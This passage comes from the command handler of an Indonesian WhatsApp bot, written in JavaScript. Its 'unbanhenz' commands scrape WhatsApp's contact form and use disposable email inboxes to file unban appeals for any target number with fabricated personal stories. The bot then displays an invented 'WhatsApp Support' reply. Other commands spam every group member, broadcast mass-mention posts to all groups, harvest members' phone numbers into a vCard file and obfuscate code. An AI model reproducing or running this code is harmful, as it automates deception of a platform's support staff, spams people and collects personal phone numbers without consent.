let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz3': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good morning/afternoon/night WhatsApp parties!
Why was my number suddenly blocked or banned when I entered a group, Please reactivate my number because I am still a junior high school student, and there are many important groups from school and assignments are sent through that group, please reactivate my number because I really need that number for school.

Please reactivate this number: [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz4': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello dear WhatsApp parties!
Can you please reactivate my number because suddenly my number has been blocked and I have not done anything wrong that is against the community or the rules given by WhatsApp, I beg you to reactivate this number: [${targetnya}]], because I really need this number for my business i have a lot of work in my number it is a lot of important group for me to work! Please reactivate my number, thank you very much.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz5': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo Dukungan WhatsApp, Saya salah Satu pengguna WhatsApp Dengan Nomor ]${targetnya} Sayangnya Akun WhatsApp saya telah Di blokir Saya Maaf Telah Menginstal Aplikasi Pihak Thard

Karena Kesalahan. Saya Meminta untuk Membuka Blokir akun Saya. Tolong Bantu Saya untuk membuka blokirnya sesegera mungkin. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz6': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hallo, saya tidak melakukan kesalahan apapun, tiba-tiba nomor saya di nonaktifkan ketika masuk ke grup maka saya mohon kepada pihak whatsapp yang terhormat, tolong aktifkan kembali nomor saya [${targetnya}]
`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanhenz7': {
if (!isOwner) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Nomor saya baru, dan dengan itu saya baru saja membuka industri dan di Grup ini saya sangat membutuhkan akun saya, saya tidak melanggar aturan apa pun dari kebijakan privasi, jadi saya meminta tim dukungan whatsapp mengambil tindakan sesegera mungkin agar saya dapat memiliki akses ke materi dari grup saya [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case "pushcontactv2":
if (!isOwner) return khususOwner()
if (msg.isGroup) return reply(`Fitur Ini Hanya Bisa Digunakan Di Private Chat`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const hay = q.split("|")[1]
const groupMetadataa = !m.isGroup? await Kyuu.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
Kyuu.sendMessage(mem, { text: hay })
await sleep(2000)
}
reply("*SUCCESFUL ✅*")
break
case "jpm": case "post": {
if (!isOwner) return khususOwner()
if (!text) return replygcxeon(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await Kyuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Kyuu.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Kyuu.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Kyuu.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Kyuu.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL ✅*")
}
break
case "promote": case "gcast": {
if (!isOwner) return khususOwner()
if (!text) return replygcxeon(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await Kyuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Kyuu.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Kyuu.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Kyuu.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]})
await sleep(text.split('|')[1])
} else {
await Kyuu.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply(`*✅ Berhasil terkirim : ${anu}*`)
}
break
case "savecontact": {
if (!isOwner) return khususOwner()
if (!m.isGroup)  return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await replygcxeon("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = m.isGroup? await Kyuu.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
replygcxeon("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Kyuu.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
    case 'credit': case 'credito': case 'credits': case 'cr': {
me = m.sender
teks = `*Recode Developer*
> _Casper_

*Donator Participant*
> _VinnJoy_ - Heroku

*Base Developer*
> _DGXeon_`
sendKyuuMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'enc': {
            if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'bott': case 'bot?': case 'bot': case 'hi': case 'halo': case 'hallo': {
xeonezy = `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*`
Kyuu.sendMessage(from, { 
text: xeonezy,
contextInfo:{
forwardingScore: 0,
isForwarded: true, 
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title":wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: fakestatus })
}
break

case 'menu': case 'help': {
            if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            xeonezy = `  *ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️ *ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️ *ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️ *ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️ *ᴏᴡɴᴇʀ* : *${global.namaku}*
   
𖣂 *I N F O* 
   ⛩️ *ᴏᴡɴᴇʀ* = For Owner
   ⛩️ *ɢʀᴏᴜᴘ* = For Group
   ⛩️ *ғʀᴇᴇ* = For Free User
   ⛩️ *ᴘʀᴇᴍɪᴜᴍ* = For Premium User
 
*L I S T - M E N U*

┌ ◦ *.ᴍᴇɴᴜᴀʟʟ*
々 *.ᴍᴇɴᴜᴏᴡɴᴇʀ*
々 *.ᴍᴇɴᴜʙᴜɢ*
々 *.ᴍᴇɴᴜᴀɴᴛɪ*
々 *.ᴍᴇɴᴜɢᴀᴍᴇ*
々 *.ᴍᴇɴᴜᴩᴜꜱʜ*
└ ◦ *.ᴄʀᴇᴅɪᴛ*

ꜰᴏᴜɴᴅ ᴀ ʙᴜɢ? ᴩʟᴇᴀꜱᴇ ʀᴇᴩᴏʀᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴩᴇʀ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴏᴡɴᴇʀ *.ᴏᴡɴᴇʀ*

ᴩᴏᴡᴇʀᴇᴅ ʙy *${global.ownername}*`
            let ments = [ownernya, me, mark]        
           Kyuu.sendMessage(from, { 
text: xeonezy,
contextInfo:{
forwardingScore: 0,
isForwarded: true, 
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title":wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kyuuThumb,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: fakestatus })
var menump3 = fs.readFileSync('./Tes.mp3')
await Kyuu.sendMessage(m.chat,{audio:menump3,
mimetype: 'audio/mpeg',ptt:true},
{quoted})}
        break
case 'menuall': {
     if (!isRegistered) return replygcxeon('Kamu belum daftar!\nSilahkan daftar dengan cara *.daftar nama|umur!*')
var unicorn = await getBuffer(picak+'All Menu')
sendKyuuMessage(from, { 
text: `*ʜᴀʟᴏ ᴋᴀᴋ , @${sender.split("@")[0]} 👋.*
ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.

𖣂 *I N F O - B O T*
   ⛩️*ʙᴏᴛ ɴᴀᴍᴇ* : *${global.botname}*
   ⛩️*ᴠᴇʀꜱɪᴏɴ* : *6*
   ⛩️*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
   ⛩️*ᴏᴡɴᴇʀ* : *${global.namaku}*


𖣂 *I N F O* 
   ⛩️*ᴏᴡɴᴇʀ* = For Owner
   ⛩️*ɢʀᴏᴜᴘ* = For Group
   ⛩️*ғʀᴇᴇ* = For Free User
   ⛩️*ᴘʀᴇᴍɪᴜᴍ* = For Premium User

*A L L  M E N U*

*𖣂  O W N E R  M E N U ッ*

┌ ◦ ${prefix}self  *ᴏᴡɴᴇʀ*
々 ${prefix}public  *ᴏᴡɴᴇʀ*
々 ${prefix}join  *ᴏᴡɴᴇʀ*
々 ${prefix}bctext  *ᴏᴡɴᴇʀ*
々 ${prefix}bcimage  *ᴏᴡɴᴇʀ*
々 ${prefix}bcvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}creategc  *ᴏᴡɴᴇʀ*
々 ${prefix}setexif  *ᴏᴡɴᴇʀ*
々 ${prefix}shutdown  *ᴏᴡɴᴇʀ*
々 ${prefix}autostickergc  *ᴏᴡɴᴇʀ*
々 ${prefix}setppbot  *ᴏᴡɴᴇʀ*
々 ${prefix}addprem  *ᴏᴡɴᴇʀ*
々 ${prefix}delprem  *ᴏᴡɴᴇʀ*
々 ${prefix}addowner  *ᴏᴡɴᴇʀ*
々 ${prefix}delowner  *ᴏᴡɴᴇʀ*
々 ${prefix}addvn  *ᴏᴡɴᴇʀ*
々 ${prefix}delvn  *ᴏᴡɴᴇʀ*
々 ${prefix}addsticker  *ᴏᴡɴᴇʀ*
々 ${prefix}delsticker  *ᴏᴡɴᴇʀ*
々 ${prefix}addimage  *ᴏᴡɴᴇʀ*
々 ${prefix}delimage  *ᴏᴡɴᴇʀ*
々 ${prefix}addvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}delvideo  *ᴏᴡɴᴇʀ*
々 ${prefix}block add  *ᴏᴡɴᴇʀ*
々 ${prefix}getsesi  *ᴏᴡɴᴇʀ*
々 ${prefix}backup  *ᴏᴡɴᴇʀ*
々 ${prefix}enc  *ᴏᴡɴᴇʀ*
々 ${prefix}unblock del  *ᴏᴡɴᴇʀ*
└ ◦ ${prefix}leavegc  *ᴏᴡɴᴇʀ*

*𖣂  P U S H  M E N U ッ*  

┌ ◦ ${prefix}pushcontact  *ᴏᴡɴᴇʀ*
々 ${prefix}pushcontactv2  *ᴏᴡɴᴇʀ*
々 ${prefix}savecontact  *ᴏᴡɴᴇʀ*
々 ${prefix}pushmember  *ᴏᴡɴᴇʀ*
々 ${prefix}idgc  *ᴏᴡɴᴇʀ*
